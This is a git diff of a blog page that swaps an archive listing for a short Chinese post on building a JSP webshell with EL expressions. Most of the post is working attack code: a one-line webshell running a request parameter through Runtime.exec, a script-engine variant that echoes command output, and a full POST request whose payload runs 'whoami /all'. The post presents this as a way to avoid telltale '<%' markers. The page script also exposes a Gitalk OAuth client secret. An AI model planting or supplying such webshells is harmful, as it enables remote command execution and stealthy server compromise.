@@ -24,7 +24,7 @@ var _hmt = _hmt || [];
     <meta name="description" content="" />
     
     <title>
-      归档2022 - 白帽酱の博客
+      构建jsp webshell的一个小trick - 白帽酱の博客
     </title>
     <link rel="manifest" href="/manifest.json" />
     <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
@@ -69,7 +69,7 @@ var _hmt = _hmt || [];
           首页
         </a>
         
-        <a href="/archives" class="current">
+        <a href="/archives" class="">
           归档
         </a>
         
@@ -123,7 +123,7 @@ var _hmt = _hmt || [];
             首页
           </a>
           
-          <a href="/archives" class="current">
+          <a href="/archives" class="">
             归档
           </a>
           
@@ -172,70 +172,92 @@ var _hmt = _hmt || [];
     </div>
     <div id="container">
       <div class="main animated bounceInRight delay-0.7s">
-        <div id="archives">
-    
-        <div class="title">
-            归档 
-             - 2022
-        </div>
-    
-
-
-
-
-    
-    
-    <section class="wrap">
-        <div class="meta">
-            <a href="/archives/2022" >
-                2022
-            </a>
-        </div>
-        <div class="year">
-            
-            <article class="item">
-            <a href="/2022/04/18/jsp-webshell-trick/" title="构建jsp webshell的一个小trick">
-                <span>2022/04/18</span>
-                <span>构建jsp webshell的一个小trick</span>
-            </a>
-            </article>
-            
-
-
-            <article class="item">
-            <a href="/2022/03/27/wlch/" title="如何打造一个网络空间资产测绘系统--网络框架测绘の开发笔记">
-                <span>2022/03/27</span>
-                <span>如何打造一个网络空间资产测绘系统--网络框架测绘の开发笔记</span>
-            </a>
-            </article>
-            
-
-
-            <article class="item">
-            <a href="/2022/03/27/sunlogin12rce/" title="向日葵12の一个有趣的RCE">
-                <span>2022/03/27</span>
-                <span>向日葵12の一个有趣的RCE</span>
-            </a>
-            </article>
-            
-
-
-            <article class="item">
-            <a href="/2022/01/25/ldap-inject-1/" title="记一次src测试中的ldap注入深入利用">
-                <span>2022/01/25</span>
-                <span>记一次src测试中的ldap注入深入利用</span>
-            </a>
-            </article>
-            
-    
-        </div>
-    </section>
+        <article class="post-entry">
+    <div class="header">
       
-<div class="paginator">
-    <span class="page-number current">1</span>
-</div>
-</div>
+      <div class="title">构建jsp webshell的一个小trick</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2022/04/18</span>
+        </span>
 
+        
+
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/笔记">笔记</a>
+                
+              
+          </span>
+        </span>
+        
+        
+        
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><p>jsp中可以使用el表达式<br>所以我们可以使用和el表达式注入一样的方法构造webshell</p>
+<p>可以避免出现 &lt;%符号</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">${Runtime.getRuntime().exec(param.a)}<br></code></pre></td></tr></tbody></table></figure>
+<p>无回显执行  没错就这么短 这才叫一句话<br>嘛 )</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">${''.getClass().forName(param.aef).newInstance().getEngineByName("javascript").eval(param.aef1)}<br></code></pre></td></tr></tbody></table></figure>
+<p>使用js脚本引擎回显执行</p>
+<p>POST /?aef=javax.script.ScriptEngineManager HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 373<br>Connection: close</p>
+<p>aef1=try{load(“nashorn:mozilla_compat.js”);}catch (e){}importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[2];s[0]=’cmd’;s[1]=’/c whoami /all’;a=””;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output+=+new BufferedReader(new+InputStreamReader(b));while ((line=output.readLine()) != null) {a=a%2Bline%2B”\n”};a</p>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2022/03/27/wlch/">如何打造一个网络空间资产测绘系统--网络框架测绘の开发笔记</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="https://rce.moe">白帽酱</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="https://rce.moe/2022/04/18/jsp-webshell-trick/">https://rce.moe/2022/04/18/jsp-webshell-trick/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="https://rce.moe">白帽酱</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script type="text/javascript">
+    new Gitalk({
+        clientID: '1488ae49eda310270a91',
+        clientSecret: '83e505f36d0351b0ef1a225d089546cb40ecd31a',
+        repo: 'hexoblog',
+        owner: 'burpheart',
+        admin: 'burpheart',
+        id: md5(location.pathname),
+        distractionFreeMode: true
+    }).render('gitalk-container')
+</script>
         <footer>
           <div class="copyright">
             ©2022
